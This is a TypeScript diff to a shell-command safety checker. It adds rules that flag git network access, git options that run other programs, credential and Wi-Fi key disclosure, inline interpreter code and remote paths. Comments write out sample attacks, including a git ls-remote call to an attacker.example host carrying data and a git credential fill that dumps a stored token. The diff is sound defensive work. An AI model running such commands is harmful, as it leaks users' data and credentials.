@@ -177,7 +177,86 @@ function isReadOnlyArp(segment: string): boolean {
 const NETSH_WRITE_VERBS = [
     'set', 'add', 'delete', 'reset', 'export', 'import', 'exec', 'install', 'uninstall',
     'flush', 'renew', 'connect', 'disconnect', 'reconnect', 'start', 'stop',
+    'enable', 'disable', 'refresh',
 ];
+
+// ── git ─────────────────────────────────────────────────────────────────────
+//
+// git never takes the whitelist fast path (it is a RUNNER_COMMANDS entry), but
+// some of its options make even `git status` run another program, and that has
+// to stop on every strategy.
+
+// Global options that take a value, so `-C <dir>` is skipped as a pair, and
+// those that take none. Any other global option is `unknown`: it may take a
+// value git reads as the subcommand (`--attr-source x fetch`), so the git
+// rules fail closed on it.
+const GIT_VALUE_GLOBALS = new Set(['-C', '-c', '--git-dir', '--work-tree', '--namespace', '--config-env', '--attr-source', '--super-prefix']);
+const GIT_FLAG_GLOBALS = new Set([
+    '-p', '-P', '--paginate', '--no-pager', '--bare', '--no-replace-objects', '--literal-pathspecs',
+    '--glob-pathspecs', '--noglob-pathspecs', '--icase-pathspecs', '--no-optional-locks',
+    '--no-lazy-fetch', '--no-advice', '--version', '--help', '--exec-path', '--html-path',
+    '--man-path', '--info-path', '-v', '-h',
+]);
+
+/** `git [globals] <sub> <rest…>`, with the first non-option word of `rest`. */
+function gitParts(segment: string): { globals: string[]; sub: string; rest: string[]; verb: string; unknown: boolean } {
+    const words = argWords(segment);
+    const globals: string[] = [];
+    let unknown = false;
+    let i = 0;
+    while (i < words.length && words[i].startsWith('-')) {
+        const w = words[i];
+        globals.push(w);
+        if (GIT_VALUE_GLOBALS.has(w)) {
+            i += 2;
+            continue;
+        }
+        const name = w.replace(/=.*$/, '');
+        if (!GIT_FLAG_GLOBALS.has(w) && !(w.includes('=') && (GIT_VALUE_GLOBALS.has(name) || name.startsWith('--')))) {
+            unknown = true;
+        }
+        i++;
+    }
+    const rest = words.slice(i + 1);
+    return {
+        globals,
+        sub: (words[i] ?? '').toLowerCase(),
+        rest,
+        verb: (rest.find((w) => !w.startsWith('-')) ?? '').toLowerCase(),
+        unknown,
+    };
+}
+
+/**
+ * git forms that run another program: `-c <key>=<value>` and `--config-env`
+ * can set `core.fsmonitor`, `core.pager`, `core.sshCommand` or an `!alias` to
+ * any command line; `--exec-path=<dir>` runs git's own helpers from that
+ * directory; `grep -O<pager>` opens the hits in a program; `bisect run` and
+ * `submodule foreach` run the command they are given.
+ */
+function gitRunsAnotherProgram(segment: string): boolean {
+    const { globals, sub, rest, verb } = gitParts(segment);
+    if (globals.some((w) => /^-c/.test(w) || /^--config-env\b/.test(w) || /^--exec-path=/.test(w))) return true;
+    if (sub === 'grep') return rest.some((w) => /^(?:-O|--open-files-in-pager\b)/.test(w));
+    return (sub === 'bisect' && verb === 'run') || (sub === 'submodule' && verb === 'foreach');
+}
+
+// Subcommands that talk to a remote, whatever their options. `remote-<helper>`
+// and the plumbing transports (`http-fetch`, `send-pack`, …) take any URL.
+const GIT_REMOTE_SUBCOMMANDS = /^(?:ls-remote|fetch|clone|pull|push|request-pull|send-email|imap-send|http-fetch|http-push|send-pack|fetch-pack|upload-pack|receive-pack|upload-archive|svn|p4|remote-.+)$/;
+
+/** Whether a git segment contacts a remote. Options may sit anywhere. */
+function gitContactsRemote(segment: string): boolean {
+    const { sub, rest, verb, unknown } = gitParts(segment);
+    if (unknown || GIT_REMOTE_SUBCOMMANDS.test(sub)) return true;
+    // A second net that does not depend on finding the subcommand: the remote
+    // verbs anywhere as a word, as the rule matched them before.
+    if (/(?:^|\s)(?:ls-remote|fetch|clone|pull|push|request-pull|send-email|imap-send|http-fetch|http-push|send-pack|fetch-pack|credential)(?:\s|$)/.test(segment)) return true;
+    if (sub === 'archive') return rest.some((w) => /^--remote\b/.test(w));
+    if (sub === 'remote') return ['update', 'show', 'prune', 'set-head'].includes(verb);
+    if (sub === 'submodule') return ['update', 'sync', 'add'].includes(verb);
+    return false;
+}
 
 /** A netsh segment as netsh reads it: quotes and cmd `^` escapes removed. */
 function netshText(segment: string): string {
@@ -206,7 +285,8 @@ function dateSetsClock(segment: string): boolean {
             i++; // the option's value
             continue;
         }
-        if (w.startsWith('-')) continue;
+        // cmd's `date /t` prints the date without prompting for a new one.
+        if (w.startsWith('-') || /^\/t$/i.test(w)) continue;
         if (!w.startsWith('+')) return true;
     }
     return false;
@@ -360,10 +440,11 @@ const EGRESS_OPTION_RULES: Record<string, FlagRule[]> = {
     ],
     // `git ls-remote https://attacker.example/?d=…` — any URL, any data.
     git: [
-        {
-            patterns: [/(?:^|\s)(?:ls-remote|fetch|clone|pull|push|request-pull|send-email|archive\s+--remote|remote\s+(?:update|show|prune)|submodule\s+(?:update|sync|add))\b/],
-            reason: 'git contacts a remote repository',
-        },
+        { patterns: [], check: gitContactsRemote, reason: 'git contacts a remote repository' },
+        { patterns: [], check: gitRunsAnotherProgram, reason: 'git told to run another program (-c / --config-env / --exec-path / grep -O / bisect run / submodule foreach)' },
+        // `echo url=https://github.com | git credential fill` prints the stored
+        // token from the credential helper, like netsh key=clear below.
+        { patterns: [], check: (seg) => /^credential(?:-|$)/.test(gitParts(seg).sub), reason: 'git credential prints a stored password' },
     ],
     openssl: [
         { patterns: [/(?:^|\s)(?:s_client|s_time|ocsp)\b/], reason: 'openssl connects to a server' },
@@ -381,10 +462,14 @@ const EGRESS_OPTION_RULES: Record<string, FlagRule[]> = {
             check: (seg) => {
                 const s = netshText(seg);
                 if (/(?:^|\s)k[a-z]*\s*=\s*c/i.test(s)) return true;
-                // A bare value in key's place: `clear`, `cle`, `c`.
-                return s.split(/\s+/).some((w) => ['c', 'cl', 'cle', 'clea', 'clear'].includes(w.toLowerCase()));
+                // `show hostednetwork setting=security` prints the hosted
+                // network's key the same way.
+                if (/(?:^|\s)s[a-z]*\s*=\s*sec/i.test(s)) return true;
+                // A bare value in key's or setting's place: `clear`, `cle`, `c`,
+                // `security`, `sec`.
+                return s.split(/\s+/).some((w) => /^(?:c|cl|cle|clea|clear|sec|secu|secur|securi|securit|security)$/i.test(w));
             },
-            reason: 'netsh shows a saved Wi-Fi key in plain text (key=clear)',
+            reason: 'netsh shows a saved Wi-Fi key in plain text (key=clear / setting=security)',
         },
         // cmd rewrites `%…%` / `!…!` before netsh runs, so `key=%COMSPEC:~…%`
         // can spell clear (or a verb) out of sight of every rule here.
@@ -511,12 +596,14 @@ const NETWORK_EGRESS_COMMANDS: Set<string> = new Set([
 // keeps its brackets inside quotes, and `pwsh -EncodedCommand <base64>` hides
 // everything. Each entry tests one argument word for the inline-code option.
 const INLINE_CODE_OPTIONS: Record<string, (word: string) => boolean> = {
-    python: (w) => /^-[A-Za-z]*c$/.test(w),
+    // python, perl, ruby, php and lua also take the program glued to the
+    // option (`python3 -c'…'`, `perl -e'…'`), so anything may follow it.
+    python: (w) => /^-[A-Za-z]*c/.test(w),
     node: (w) => /^-[A-Za-z]*[ep]$/.test(w) || /^--(?:eval|print)(?:=|$)/.test(w),
-    perl: (w) => /^-[A-Za-z]*[eE]$/.test(w),
-    ruby: (w) => /^-[A-Za-z]*e$/.test(w),
-    php: (w) => /^-[A-Za-z]*r$/.test(w),
-    lua: (w) => /^-[A-Za-z]*e$/.test(w),
+    perl: (w) => /^-[A-Za-z]*[eE]/.test(w),
+    ruby: (w) => /^-[A-Za-z]*e/.test(w),
+    php: (w) => /^-[A-Za-z]*r/.test(w),
+    lua: (w) => /^-[A-Za-z]*e/.test(w),
     osascript: (w) => w === '-e',
     // `-Command` / `-EncodedCommand` / `-CommandWithArgs` and any prefix
     // PowerShell accepts (`-c`, `-enc`, `-ec`, `-cwa`), with `-` or `/`; `-`
@@ -578,6 +665,12 @@ function pwshTakesValue(p: string): boolean {
  * PowerShell (`powershell iwr …` runs as `-Command`) but the script for pwsh 7.
  */
 function hasInlineCode(name: string, family: string, args: string[]): boolean {
+    // deno takes code as a subcommand (`deno eval "…"`) and runs scripts
+    // straight from a URL (`deno run https://…`).
+    if (family === 'deno') {
+        return args.find((w) => !w.startsWith('-')) === 'eval'
+            || args.some((w) => /^https?:\/\//i.test(stripTokenQuotes(w)));
+    }
     const isInline = INLINE_CODE_OPTIONS[family];
     if (!isInline) return false;
     // PowerShell takes `-x` and `/x`, cmd `/x`, POSIX shells `-x` and `+x`;
@@ -632,11 +725,19 @@ function interpreterFamily(name: string): string {
  * `\\wsl$\…` / `\\wsl.localhost\…` are not remote.
  */
 function namesRemotePath(word: string): boolean {
-    const t = stripTokenQuotes(word.replace(/^-{1,2}[\w-]+[:=]/, '').replace(/^.*::/, ''));
-    if (/^\\\\\?\\UNC\\/i.test(t)) return true;
+    // A parameter prefix in either style (`-Path:`, `--file=`, cmd's `/g:`),
+    // and Windows reads `/` as `\`, so `/\host\x` and `//host/x` are `\\host\x`.
+    const t = stripTokenQuotes(
+        stripTokenQuotes(word)
+            .replace(/^(?:-{1,2}[\w-]+[:=]|\/[A-Za-z]+:)/, '')
+            .replace(/^.*::/, ''),
+    ).replace(/\//g, '\\');
+    // `\\?\UNC\host` and `\\.\UNC\host` are the same share; GLOBALROOT reaches
+    // it too (`\\?\GLOBALROOT\Device\Mup\host\…`). Other device paths are local.
+    if (/^\\\\[?.]\\(?:UNC|GLOBALROOT)\\/i.test(t)) return true;
     if (/^\\\\[?.]\\/.test(t)) return false;
     if (/^\\\\wsl(?:\$|\.localhost)\\/i.test(t)) return false;
-    return /^(?:\\\\|\/\/)[^\\/\s]/.test(t);
+    return /^\\\\[^\\\s]/.test(t);
 }
 
 /**
@@ -678,6 +779,60 @@ function commandNames(word: string): string[] {
     const asPath = normalizeBaseCommand(word);
     const unescaped = normalizeBaseCommand(word.replace(/\\/g, ''));
     return unescaped === asPath ? [asPath] : [asPath, unescaped];
+}
+
+/**
+ * The text with every `$` that sits inside a real single-quoted span replaced
+ * by U+0001 (word boundaries unchanged). One left-to-right pass tracks quote
+ * state, so a `'` inside double quotes or escaped with `\` does not open a span:
+ * in `env -u "'" $C x "'"` the `$C` is unquoted and stays. An unterminated
+ * single quote masks nothing.
+ */
+function maskSingleQuotedDollars(text: string): string {
+    let out = '';
+    let state: 'none' | 'single' | 'double' = 'none';
+    let span = '';
+    for (let i = 0; i < text.length; i++) {
+        const c = text[i];
+        if (state === 'single') {
+            span += c;
+            if (c === "'") {
+                out += span.replace(/\$/g, '\u0001');
+                span = '';
+                state = 'none';
+            }
+            continue;
+        }
+        if (c === '\\' && i + 1 < text.length) {
+            out += c + text[++i];
+            continue;
+        }
+        if (state === 'double') {
+            if (c === '"') state = 'none';
+        } else if (c === '"') {
+            state = 'double';
+        } else if (c === "'") {
+            state = 'single';
+            span = c;
+            continue;
+        }
+        out += c;
+    }
+    return out + span;
+}
+
+/**
+ * Whether a flag rule matches a segment, as written or as the program will
+ * receive it. The rules anchor on `(?:^|\s)`, so `dig "@203.0.113.5"` or
+ * `ping "-p" …` slipped them while the shell hands the program the bare
+ * option; quotes, backticks, `\` and cmd `^` are removed for the second test.
+ */
+function flagRuleMatches(rule: FlagRule, segment: string): boolean {
+    // A quoted span stays one word (`date +"%Y %m"`), as the program gets it.
+    const bare = segment
+        .replace(/(["'])(.*?)\1/g, (_m, _q, body: string) => body.replace(/\s/g, '_'))
+        .replace(/["'`^\\]/g, '');
+    return [segment, bare].some((text) => rule.patterns.some((p) => p.test(text)) || rule.check?.(text));
 }
 
 /** A leading shell assignment, `FOO=1` in `FOO=1 curl …`. */
@@ -847,6 +1002,14 @@ export function networkEgressDanger(command: string): StructuralDanger {
         for (let s = 0; s < segments.length; s++) {
             const segment = segments[s];
             const words = segment.trim().split(/\s+/).filter(Boolean);
+            // The same words with every `$` inside single quotes masked: POSIX
+            // shells and PowerShell keep it literal there (`sed -n '$p'`,
+            // `awk '$3 > 100'`). cmd does not treat `'` as a quote, but it does
+            // not expand `$` either. Masking keeps the word boundaries.
+            const unquotedDollar = maskSingleQuotedDollars(segment)
+                .trim()
+                .split(/\s+/)
+                .filter(Boolean);
 
             if (words.some(namesRemotePath)) {
                 return {
@@ -858,7 +1021,8 @@ export function networkEgressDanger(command: string): StructuralDanger {
             for (const { word: tok, index } of commandPositions(segment)) {
                 // `c$@url`, `$CMD …`, `cu%COMSPEC:~0,0%rl …`, `!X!`: the name the
                 // shell runs is not the one written.
-                if (/[$%!]/.test(tok) && !isAssignment(tok)) {
+                const builtFromVariable = /[%!]/.test(tok) || (unquotedDollar[index] ?? '').includes('$');
+                if (builtFromVariable && !isAssignment(tok)) {
                     return {
                         danger: true,
                         reason: 'A command name built from a variable ($ / % / !) — needs manual review',
@@ -894,7 +1058,7 @@ export function networkEgressDanger(command: string): StructuralDanger {
 
                     const rules = EGRESS_OPTION_RULES[name];
                     const ownLine = own.join(' ');
-                    const hit = rules?.find((r) => r.patterns.some((p) => p.test(ownLine)) || r.check?.(ownLine));
+                    const hit = rules?.find((r) => flagRuleMatches(r, ownLine));
                     if (hit) {
                         return { danger: true, reason: `${hit.reason} — needs manual review` };
                     }
@@ -1036,7 +1200,7 @@ function classifySegment(
         const flagRules = DANGEROUS_FLAGS[baseLower];
         if (flagRules) {
             for (const rule of flagRules) {
-                if (rule.patterns.some((pat) => pat.test(segment)) || rule.check?.(segment)) {
+                if (flagRuleMatches(rule, segment)) {
                     return { safe: false, reason: rule.reason };
                 }
             }
